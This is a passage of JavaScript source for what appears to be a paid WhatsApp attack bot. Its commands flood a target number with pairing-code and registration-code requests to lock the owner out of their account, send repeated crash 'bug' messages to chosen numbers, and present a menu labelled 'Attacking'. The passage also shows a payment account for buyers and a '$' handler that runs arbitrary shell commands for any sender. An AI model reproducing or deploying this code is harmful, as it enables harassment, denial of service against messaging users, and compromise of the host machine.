                    resolveMsgBuffer,
                    logger: pino({
                        level: "silent"
                    }),
                    level: 'fatal'
                })
                for (let i = 0; i < pepekk; i++) {
                    await sleep(2000)
                    let prc = await sucked.requestPairingCode(target)
                    await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
                }
                await sleep(2000)
            }
            break
            case 'acc':
            case 'aza': {
                let bankDetails = `*BANK DETAILS*\n` +
                    `👾 _*BOLAJI*_\n\n` +
                    `🔢 7041039367\n\n` +
                    `🏦 _*OPAY*_\n` +
                    `*DROP SCREENSHOT AFTER PAYMENT ASAPUU🔪*`;

                reply(bankDetails);
                break;
            }
            case 'nice': {
                reply(`*${pushname}* *𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒄𝒐𝒎𝒑𝒍𝒊𝒎𝒆𝒏𝒕*`)
            }
            break
            case 'tempban': {
                if (!isOwner) return reply(mess.only.owner)
                if (!isBuyer) return reply(mess.only.buyer)
                if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
                if (!/|/.test(text)) return reply(`The data you provided is invalid!, Example: \n ${command} 62|8xxx`)
                let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))

                let cCode = q.split("|")[0]
                let number = q.split("|")[1]
                let fullNo = cCode + number

                await reply(`❗ Success! Registration Disturbance has been successfully activated to the target : ${fullNo} use ${command} indefinitely ✅. Registration interruption will be stopped if the server is restarted, turned off, or down Ⓜ️.`)

                let {
                    state,
                    saveCreds
                } = await useMultiFileAuthState('tb')

                let spam = makeWaSocket({
                    auth: state,
                    mobile: true,
                    logger: pino({
                        level: 'silent'
                    })
                })

                let dropNumber = async () => {
                    try {
                        let res = await spam.requestRegistrationCode({
                            phoneNumber: `+${fullNo}`,
                            phoneNumberCountryCode: cCode,
                            phoneNumberNationalNumber: number,
                            phoneNumberMobileCountryCode: 724,
                        })

                        if (res.reason === 'temporarily_unavailable') {
                            console.log(`Invalid Number (Possibly Registration Interrupted): +${res.login}`)
                            await sleep(1000)
                            await dropNumber()
                        }
                    } catch (error) {
                        console.error(error)
                    }
                }

                numbers[fullNo] = {
                    cCode,
                    number
                };
                fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
                setInterval(() => {
                    dropNumber()
                }, 400)
            }
            break
            case 'getpp': {
                if (!m.isGroup) return reply(mess.only.group)
                let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                let ghosst = userss
                try {
                    var ppuser = await blue.profilePictureUrl(ghosst, 'image')
                } catch (err) {
                    var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
                }
                blue.sendMessage(from, {
                    image: {
                        url: ppuser
                    }
                }, {
                    quoted: m
                })
            }
            break

            case 'antibugon': {
                if (!isOwner) return reply(mess.only.owner)
                if (!isBuyer) return reply(mess.only.buyer)
                global.antibug = true
                return reply('*ANTIBUG ACTIVATED*')
            }
            break

            case 'antibugoff': {
                if (!isOwner) return reply(mess.only.owner)
                if (!isBuyer) return reply(mess.only.buyer)
                global.antibug = false
                return reply('*ANTIBUG DEACTIVATED*')
            }
            break
case 'hehe':
    if (!isPremium) return reply(mess.only.premium);
    if (!isBuyer) return reply(mess.only.buyer);
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
        return reply('This number is restricted from being attacked.');
    }
    
    reply(bugres);

    for (let i = 0; i < 50; i++) {
        await buk1(blue, target, "p", 1020000, ptcp = true);
        await sendQP(target, wanted);
        await beta2(blue, target, wanted);
        await sendSessionStructure(target, wanted);
        await beta1(blue, target, wanted);
    }

    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    break;

case 'bluesays':
    if (!isPremium) return reply(mess.only.premium);
    if (!isBuyer) return reply(mess.only.buyer);
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
        return reply('This number is restricted from being attacked.');
    }
    
    reply(bugres);

    for (let i = 0; i < 50; i++) {
        await buk1(blue, target, "p", 1020000, ptcp = true);
        await sendQP(target, wanted);
        await beta2(blue, target, wanted);
        await sendSessionStructure(target, wanted);
        await beta1(blue, target, wanted);
    }

    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    break;

case 'nighty':
case 'bluedid':
    if (!isPremium) return reply(mess.only.premium);
    if (!isBuyer) return reply(mess.only.buyer);
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
        return reply('This number is restricted from being attacked.');
    }
    
    reply(bugres);

    for (let i = 0; i < 30; i++) {
        await buk1(blue, target, "p", 1020000, ptcp = true);
        await sendQP(target, wanted);
        await beta2(blue, target, wanted);
        await sendSessionStructure(target, wanted);
        await beta1(blue, target, wanted);
    }

    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    break;

case 'xios':
case 'xip':
    if (!isPremium) return reply(mess.only.premium);
    if (!isBuyer) return reply(mess.only.buyer);
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
        return reply('This number is restricted from being attacked.');
    }
    
    reply(bugres);

    for (let i = 0; i < 40; i++) {
        await buk1(blue, target, "p", 1020000, ptcp = true);
        await sendQP(target, wanted);
        await beta2(blue, target, wanted);
        await sendSessionStructure(target, wanted);
        await beta1(blue, target, wanted);
    }

    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    break;

case 'overflow':
case 'vasion':
case 'crashflow':
    if (!isPremium) return reply(mess.only.premium);
    if (!isBuyer) return reply(mess.only.buyer);
    if (!q) return reply(`Example: ${prefix + command} 62×××`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    if (restrictedTargets.includes(target.replace("@s.whatsapp.net", ""))) {
        return reply('This number is restricted from being attacked.');
    }
    
    reply(bugres);

    for (let i = 0; i < 40; i++) {
        await buk1(blue, target, "p", 1020000, ptcp = true);
        await sendQP(target, wanted);
        await beta2(blue, target, wanted);
        await sendSessionStructure(target, wanted);
        await beta1(blue, target, wanted);
    }

    reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`);
    break;
            case 'xcrash': {
                if (!isPremium) return reply(mess.only.premium)
                if (!isBuyer) return reply(mess.only.buyer)
                if (restrictedTargets.includes(inputNumber)) {
        return reply('This number is restricted from being attacked.');
    }
                if (!q) return reply(`Example: ${prefix + command} 62×××`)
                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                let sections = [{
                        title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
                            id: `hehe ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
                            id: `bluedid ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
                            id: `bluesays ${target}`
                        }]
                    },
                    {
                        title: '⌜ 𝐈𝚯𝐒 ⌟',
                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
                            id: `xios ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
                            id: `xip ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
                        rows: [{
                            title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
                            id: `xios ${target}`
                        }]
                    },
                    {
                        title: '⌜ 𝐙𝐍𝐗 ⌟',
                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
                            id: `crashflow ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
                            id: `vasion ${target}`
                        }]
                    },
                    {
                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
                        rows: [{
                            title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
                            id: `overflow ${target}`
                        }]
                    }
                ]
                let listMessage = {
                    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸',
                    sections
                };

                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    isForwarded: true,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: "0@newsletter",
                                        newsletterName: 'Powered By Demon king',
                                        serverMessageId: -1
                                    },
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: blue.decodeJid(blue.user.id)
                                    },
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: ``
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    title: '',
                                    subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
                                    hasMediaAttachment: true,
                                    ...(await prepareWAMessageMedia({
                                        image: await fs.readFileSync("./database/image/xbug.jpg")
                                    }, {
                                        upload: blue.waUploadToServer
                                    }))
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [{
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify(listMessage)
                                    }, {
                                        "name": "cta_url",
                                        "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h\"}"
                                    }, ]
                                })
                            })
                        }
                    }
                }, {})

                await blue.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                })
            }
            break
            case 'setppbot':
            case 'setpp': {
                if (!isOwner) return reply(mess.only.owner)
                if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                var medis = await blue.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == `full`) {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await blue.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    reply(mess.success)
                } else {
                    var memeg = await blue.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    reply(mess.success)
                }
            }
            break
            case 'hdvid':
            case 'hdvideo':
            case 'vidiohd':
            case 'tohd':
            case 'vidhd': {
                const {
                    TelegraPh
                } = require('../database/lib//uploader');
                const {
                    exec
                } = require('child_process');
                const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? blue.user.jid : m.sender;
                //const name = await blue.getName(who);
                const q = m.quoted ? m.quoted : m;
                const mime = (q.msg || q).mimetype || '';
                if (!mime) return m.reply(`Mana vidio nya bang?`);
                reply(mess.wait);
                const media = await blue.downloadAndSaveMediaMessage(q);
                const url = await TelegraPh(media);
                const output = 'output.mp4'; // Nama file output
                // Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
                exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error: ${error.message}`);
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                    console.error(`stderr: ${stderr}`);

                    // Mengunggah video yang telah ditingkatkan resolusinya
                    blue.sendMessage(m.chat, {
                        caption: `_Success To HD Video_`,
                        video: {
                            url: output
                        }
                    }, {
                        quoted: m
                    });
                })
                await sleep(60000)
                fs.unlinkSync(output)
                fs.unlinkSync(media)
            }
            break




            default:
        }
        if (budy.startsWith('$')) {
            exec(budy.slice(2), (err, stdout) => {
                if (err) return reply(err)
                if (stdout) return reply(stdout)
            })
        }
        if (budy.startsWith(">")) {
            if (!isOwner) return reply(mess.only.owner)
            try {
                let evaled = await eval(budy.slice(2))
                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                await reply(evaled)
            } catch (err) {
                reply(String(err))
            }
        }
    } catch (e) {
        console.log(e)
        blue.sendMessage(`${owner}@s.whatsapp.net`, {
            text: `${util.format(e)}`
        })
    }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})